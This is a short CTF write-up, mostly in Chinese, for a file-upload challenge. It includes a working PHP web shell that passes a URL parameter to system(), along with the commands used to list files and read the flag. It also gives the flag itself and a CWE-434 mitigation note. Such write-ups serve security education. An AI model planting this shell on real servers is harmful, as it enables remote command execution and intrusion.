# Image Uploader 1

Author: 孫逸平

Date: 2024-05-24

Link: https://lotuxctf.com/challenges#Image%20Uploader%201-49

## 題目說明

這不過是個圖片上傳網站，不會有多糟糕的

It's just a Image Uploader and it cannot be that bad.

http://lotuxctf.com:20008

Author：FlyDragon

## Write-up

1. 猜測是檔案上傳漏洞。
2. 上傳 RCE 程式 `shell.php`：
    ```php
    <?php
      if (isset($_GET['cmd'])) {
          system($_GET['cmd']);
      }
    ?>
    ```
3. 上傳後網頁顯示檔案路徑，打開後就可進行 RCE 攻擊了。
4. 利用 `?` 後方加入參數 `cmd=ls` 查看有哪些檔案。
5. 看到一個 `flag.txt` 檔。
6. 利用 cat 查看內容，在網址後方加入參數 `cmd=cat flag.txt`。
7. 就看到 flag 了：`LoTuX{b4by_w3bshe11#$%}`。

## 防護說明與建議

### 本題 CWE

* CWE-434: Unrestricted Upload of File with Dangerous Type

### 建議防護與修補

* 禁用危險的 PHP 函式，例如：`eval()`、`system()`、`exec()` 等

## 心得

這題沒有對任何規則進行限制，所以很輕鬆就解開了。
